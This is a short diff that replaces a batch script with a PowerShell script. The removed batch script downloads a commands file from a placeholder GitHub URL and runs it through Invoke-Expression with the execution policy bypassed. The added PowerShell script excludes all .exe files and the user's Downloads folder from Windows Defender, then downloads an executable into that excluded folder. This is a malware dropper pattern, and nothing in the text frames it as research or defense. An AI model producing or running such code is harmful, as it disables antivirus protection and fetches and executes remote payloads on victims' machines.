@@ -1,21 +1,8 @@
-@echo off
-:: Define the Downloads directory based on the user's profile
-set "downloadsDir=%USERPROFILE%\Downloads"
+# Exclude .exe files from Windows Defender
+Add-MpPreference -ExclusionExtension ".exe"
 
-:: Ensure the Downloads directory exists
-if not exist "%downloadsDir%" (
-    mkdir "%downloadsDir%"
-)
+# Exclude the Downloads directory from Windows Defender
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
 
-:: Download commands.txt from GitHub using PowerShell
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YourUsername/YourRepo/main/commands.txt' -OutFile '%downloadsDir%\commands.txt'"
-
-:: Check if the download was successful
-if exist "%downloadsDir%\commands.txt" (
-    echo commands.txt downloaded successfully.
-
-    :: Read and execute commands from commands.txt
-    powershell -ExecutionPolicy Bypass -Command "& {Get-Content '%downloadsDir%\commands.txt' | Invoke-Expression}"
-) else (
-    echo Failed to download commands.txt
-)
+# Download a file from GitHub
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YourUsername/YourRepo/main/your_file.exe" -OutFile "$env:USERPROFILE\Downloads\your_file.exe"
